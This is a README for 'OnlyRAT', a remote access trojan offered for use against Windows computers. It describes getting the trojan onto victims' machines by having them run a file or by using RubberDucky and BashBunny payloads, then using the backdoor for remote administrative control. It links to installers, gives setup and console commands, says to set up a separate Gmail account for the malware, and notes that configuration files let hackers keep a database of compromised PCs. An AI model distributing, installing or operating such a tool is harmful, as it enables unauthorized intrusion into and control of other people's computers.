
## Overview:
RAT [Only Remote Access Tool]. We will be able to use this tool to remotely command and control windows computers. 

The RAT has a multitude of ways of how it can be installed on to a target pc. Whether it is getting them to run a file all the way to RubberDucky and BashBunny payloads.

Once installed we will have remote administrative access to our target. We can connect to our target through our Python console on our attacker pc. The onlyrat console has plenty of payloads we can then use on our target or we can simply enjoy our backdoor access. Enjoy!

## Requirements:
**Attacker PC**
- Security Linux [Debian Based]
    - Kali Linux
    - Parrot OS
- Python3
- SSH
- Gmail account
    - make a separate Gmail account for this malware
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled

**Target PC**
- Windows 10 privileged user

## Instructions:
**Target Installation**
- The [installers](https://github.com/mridul249/RAT/tree/main/installers) folder contains all the ways we can install the RAT on to our target

**Attacker Installation**
- install only rat by cloning this repository
```bash
git clone https://github.com/mridul249/RAT.git
```
- install dependencies for OnlyRAT
- restart terminal once installation is complete
```bash
cd OnlyRAT
sh install.sh
```

**Attacker Console**
- Run `onlyrat` in your terminal for help
```bash
onlyrat
```
- Append configuraiton file to specify target
```bash
onlyrat bluecosmo.rat
```

## Extraneous:

**Configuration file?**

The configuration file `username.rat` is a file we obtain through our OnlyRAT [installers](https://github.com/mridul249/RAT/tree/main/installers). It saves obfuscated information that OnlyRAT needs in order to connect back to our target computer. Having configuration files allows hackers to have a database of all the comprimised pc's they have access to.